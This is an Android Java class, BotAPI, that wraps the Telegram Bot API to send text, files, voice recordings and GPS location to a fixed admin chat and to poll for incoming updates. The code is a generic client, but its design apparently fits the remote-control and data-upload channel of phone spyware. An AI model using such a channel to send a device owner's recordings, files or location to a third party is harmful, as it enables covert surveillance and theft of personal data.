package com.black.phone;

import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import okhttp3.*;

public class BotAPI {
    private static final String TAG = "BotAPI";
    private static final MediaType JSON_MEDIA = MediaType.parse("application/json; charset=utf-8");
    private static final MediaType FILE_MEDIA = MediaType.parse("application/octet-stream");

    private final OkHttpClient client;
    private final String token;
    private final String chatId;
    public int lastUpdateId = 0;

    public BotAPI() {
        this.token = Config.get().bot_token;
        this.chatId = Config.get().admin_chat_id;
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
                .build();
    }

    public boolean sendText(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", chatId);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            RequestBody body = RequestBody.create(json.toString(), JSON_MEDIA);
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendMessage")
                    .post(body).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "sendText", e);
            return false;
        }
    }

    public boolean sendMessageWithButtons(String text, JSONArray buttons) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", chatId);
            json.put("text", text);
            json.put("parse_mode", "Markdown");

            JSONObject replyMarkup = new JSONObject();
            JSONArray keyboard = new JSONArray();

            for (int i = 0; i < buttons.length(); i++) {
                JSONArray row = buttons.getJSONArray(i);
                JSONArray rowButtons = new JSONArray();
                for (int j = 0; j < row.length(); j++) {
                    JSONObject btn = row.getJSONObject(j);
                    JSONObject button = new JSONObject();
                    button.put("text", btn.getString("text"));
                    button.put("callback_data", btn.getString("callback_data"));
                    rowButtons.put(button);
                }
                keyboard.put(rowButtons);
            }
            replyMarkup.put("inline_keyboard", keyboard);
            json.put("reply_markup", replyMarkup);

            RequestBody body = RequestBody.create(json.toString(), JSON_MEDIA);
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendMessage")
                    .post(body).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "sendMessageWithButtons", e);
            return false;
        }
    }

    public boolean answerCallbackQuery(String callbackQueryId, String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("callback_query_id", callbackQueryId);
            json.put("text", text != null ? text : "تم الاستلام");
            json.put("show_alert", false);
            RequestBody body = RequestBody.create(json.toString(), JSON_MEDIA);
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/answerCallbackQuery")
                    .post(body).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "answerCallbackQuery", e);
            return false;
        }
    }

    public boolean sendFile(File file, String caption) {
        try {
            RequestBody rb = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("caption", caption != null ? caption : "")
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(file, FILE_MEDIA))
                    .build();
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendDocument")
                    .post(rb).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "sendFile", e);
            return false;
        }
    }

    public boolean sendVoice(File audio) {
        try {
            RequestBody rb = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("voice", audio.getName(),
                            RequestBody.create(audio, FILE_MEDIA))
                    .build();
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendVoice")
                    .post(rb).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "sendVoice", e);
            return false;
        }
    }

    public boolean sendLocation(double lat, double lng) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", chatId);
            json.put("latitude", lat);
            json.put("longitude", lng);
            RequestBody body = RequestBody.create(json.toString(), JSON_MEDIA);
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendLocation")
                    .post(body).build();
            try (Response r = client.newCall(req).execute()) {
                return r.isSuccessful();
            }
        } catch (Exception e) {
            Log.e(TAG, "sendLocation", e);
            return false;
        }
    }

    public String getUpdates() {
        try {
            String url = "https://api.telegram.org/bot" + token + "/getUpdates?offset=" + lastUpdateId + "&timeout=5";
            Request req = new Request.Builder().url(url).get().build();
            try (Response r = client.newCall(req).execute()) {
                if (r.body() != null) return r.body().string();
            }
        } catch (Exception e) {
            Log.e(TAG, "getUpdates", e);
        }
        return null;
    }
}
